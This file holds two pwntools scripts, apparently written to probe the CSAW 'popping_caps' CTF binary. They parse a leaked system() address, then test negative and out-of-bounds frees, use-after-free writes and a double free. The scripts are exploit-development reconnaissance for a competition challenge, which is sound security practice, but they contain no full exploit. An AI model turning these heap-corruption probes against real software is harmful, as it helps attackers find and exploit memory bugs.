from pwn import *

# Set up the context
context.binary = '/home/ctfplayer/ctf_files/popping_caps'
context.log_level = 'info'

def connect():
    if args.REMOTE:
        return remote('pwn.chal.csaw.io', 8000)
    else:
        return process('/home/ctfplayer/ctf_files/popping_caps')

def malloc(size, p):
    p.sendlineafter(b'Your choice: ', b'1')
    p.sendlineafter(b'How many: ', str(size).encode())
    p.recvuntil(b'BANG!')

def free(offset, p):
    p.sendlineafter(b'Your choice: ', b'2')
    p.sendlineafter(b'Whats in a free: ', str(offset).encode())
    try:
        p.recvuntil(b'BANG!')
        return True
    except EOFError:
        log.error("Process crashed during free")
        return False

def write(data, p):
    p.sendlineafter(b'Your choice: ', b'3')
    p.sendlineafter(b'Read me in: ', data)
    p.recvuntil(b'BANG!')

def exit_program(p):
    p.sendlineafter(b'Your choice: ', b'4')

# Test heap manipulation
def test_heap_manipulation():
    p = connect()

    # Get the leaked system address
    leak = p.recvuntil(b'\n').decode()
    system_addr = int(leak.split('system ')[1], 16)
    log.info(f"Leaked system address: {hex(system_addr)}")

    # Allocate two chunks
    malloc(32, p)
    log.info("Allocated 32 bytes (chunk1)")

    malloc(32, p)
    log.info("Allocated 32 bytes (chunk2)")

    # Free chunk1 and see if the pointer is zeroed out
    free(0, p)
    log.info("Freed chunk1")

    # Try freeing a negative index to see if we can access memory before the array
    try:
        result = free(-1, p)
        if result:
            log.info("Negative index free succeeded")
        else:
            log.error("Negative index free failed")
    except:
        log.error("Error during negative index free")

    # Try freeing an out-of-bounds index
    try:
        result = free(10, p)
        if result:
            log.info("Out-of-bounds free succeeded")
        else:
            log.error("Out-of-bounds free failed")
    except:
        log.error("Error during out-of-bounds free")

    # Try to write to a freed chunk (use-after-free test)
    try:
        write(b'UAF testing', p)
        log.info("Write to potentially freed memory succeeded")
    except:
        log.error("Write failed")

    p.interactive()

test_heap_manipulation()

from pwn import *

# Set up the context
context.binary = '/home/ctfplayer/ctf_files/popping_caps'
context.log_level = 'info'

def connect():
    if args.REMOTE:
        return remote('pwn.chal.csaw.io', 8000)
    else:
        return process('/home/ctfplayer/ctf_files/popping_caps')

def malloc(size, p):
    log.info(f"Allocating {size} bytes")
    p.sendlineafter(b'Your choice: ', b'1')
    p.sendlineafter(b'How many: ', str(size).encode())
    return p.recvuntil(b'BANG!')

def free(offset, p):
    log.info(f"Freeing index {offset}")
    p.sendlineafter(b'Your choice: ', b'2')
    p.sendlineafter(b'Whats in a free: ', str(offset).encode())
    try:
        return p.recvuntil(b'BANG!')
    except EOFError:
        log.error(f"Process crashed during free(index={offset})")
        return None

def write(data, p):
    log.info(f"Writing data: {data}")
    p.sendlineafter(b'Your choice: ', b'3')
    p.sendlineafter(b'Read me in: ', data)
    return p.recvuntil(b'BANG!')

def exit_program(p):
    p.sendlineafter(b'Your choice: ', b'4')

# Let's try to find out if we can exploit a double-free
def test_double_free():
    p = connect()

    # Get the leaked system address
    leak = p.recvuntil(b'\n').decode()
    system_addr = int(leak.split('system ')[1], 16)
    log.info(f"Leaked system address: {hex(system_addr)}")

    # Allocate two chunks
    malloc(32, p)  # index 0
    malloc(32, p)  # index 1

    # Free index 0 - this should go to the tcache
    free(0, p)

    # Allocate a new chunk of the same size - should reuse the freed one
    malloc(32, p)  # index 0 again

    # Try to free index 0 again
    try:
        result = free(0, p)
        if result:
            log.info("Double free successful! The binary doesn't zero pointers after free")
        else:
            log.info("Double free failed")
    except:
        log.error("Error during second free")

    p.interactive()

test_double_free()

